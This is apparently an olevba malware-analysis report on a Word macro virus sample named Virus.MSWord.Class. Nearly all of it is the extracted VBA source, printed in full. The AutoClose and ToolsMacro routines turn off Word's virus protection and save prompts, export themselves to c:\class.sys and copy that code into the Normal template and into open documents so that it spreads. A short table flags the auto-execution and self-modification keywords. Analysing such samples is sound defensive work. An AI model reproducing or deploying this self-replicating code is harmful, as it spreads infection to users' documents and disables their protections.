olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class-c7cbbbfe16aa2ca06e39ea90c17d7bcf80cc3274
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Class-c7cbbbfe16aa2ca06e39ea90c17d7bcf80cc3274 
in file: Virus.MSWord.Class-c7cbbbfe16aa2ca06e39ea90c17d7bcf80cc3274 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'MACRO11/8/99 3:52:20 PMCLASS-DP
On Error GoTo out
'MACRO11/8/99 3:52:20 PMCLASS-DP
Options.VirusProtection = False
'MACRO11/8/99 3:52:20 PMCLASS-DP
Options.SaveNormalPrompt = False
'MACRO11/8/99 3:52:20 PMCLASS-DP
Options.ConfirmConversions = False
'MACRO11/8/99 3:52:20 PMCLASS-DP
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'MACRO11/8/99 3:52:20 PMCLASS-DP
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'MACRO11/8/99 3:52:20 PMCLASS-DP
If nt > 70 And ad > 0 Then GoTo out
'MACRO11/8/99 3:52:20 PMCLASS-DP
If nt < 70 Then
'MACRO11/8/99 3:52:20 PMCLASS-DP
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'MACRO11/8/99 3:52:20 PMCLASS-DP
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'MACRO11/8/99 3:52:20 PMCLASS-DP
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\\class.sys"
'MACRO11/8/99 3:52:20 PMCLASS-DP
End If
'MACRO11/8/99 3:52:20 PMCLASS-DP
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'MACRO11/8/99 3:52:20 PMCLASS-DP
host.codemodule.AddFromFile ("c:\\class.sys")
'MACRO11/8/99 3:52:20 PMCLASS-DP
With host.codemodule
'MACRO11/8/99 3:52:20 PMCLASS-DP
    For x = 1 To 4
'MACRO11/8/99 3:52:20 PMCLASS-DP
    .deletelines 1
'MACRO11/8/99 3:52:20 PMCLASS-DP
    Next x
'MACRO11/8/99 3:52:20 PMCLASS-DP
End With
'MACRO11/8/99 3:52:20 PMCLASS-DP
If nt < 70 Then
'MACRO11/8/99 3:52:20 PMCLASS-DP
    With host.codemodule
'MACRO11/8/99 3:52:20 PMCLASS-DP
    .replaceline "Sub AutoClose()", 1
'MACRO11/8/99 3:52:20 PMCLASS-DP
    .replaceline "Sub ToolsMacro()", 71
'MACRO11/8/99 3:52:20 PMCLASS-DP
    End With
'MACRO11/8/99 3:52:20 PMCLASS-DP
End If
'MACRO11/8/99 3:52:20 PMCLASS-DP
With host.codemodule
'MACRO11/8/99 3:52:20 PMCLASS-DP
    For x = 2 To 72 Step 2
'MACRO11/8/99 3:52:20 PMCLASS-DP
    .replaceline "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow, x
'MACRO11/8/99 3:52:20 PMCLASS-DP
    Next x
'MACRO11/8/99 3:52:20 PMCLASS-DP
End With
'MACRO11/8/99 3:52:20 PMCLASS-DP
out:
'MACRO11/8/99 3:52:20 PMCLASS-DP
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'MACRO11/8/99 3:52:20 PMCLASS-DP
End Sub
'MACRO11/8/99 3:52:20 PMCLASS-DP

'MACRO11/8/99 3:52:20 PMCLASS-DP
Sub ToolsMacro()
'MACRO11/8/99 3:52:20 PMCLASS-DP
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
Options.VirusProtection = False
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
Options.SaveNormalPrompt = False
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
Options.ConfirmConversions = False
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
If nt > 70 And ad > 0 Then GoTo out
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
If nt < 70 Then
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\\class.sys"
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
End If
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
host.codemodule.AddFromFile ("c:\\class.sys")
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
With host.codemodule
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    For x = 1 To 4
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    .deletelines 1
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    Next x
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
End With
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
If nt < 70 Then
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    With host.codemodule
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    .replaceline "Sub AutoClose()", 1
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    .replaceline "Sub ToolsMacro()", 71
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    End With
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
End If
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
With host.codemodule
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    For x = 2 To 72 Step 2
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    .replaceline "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow, x
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    Next x
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
End With
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
out:
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
End Sub
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
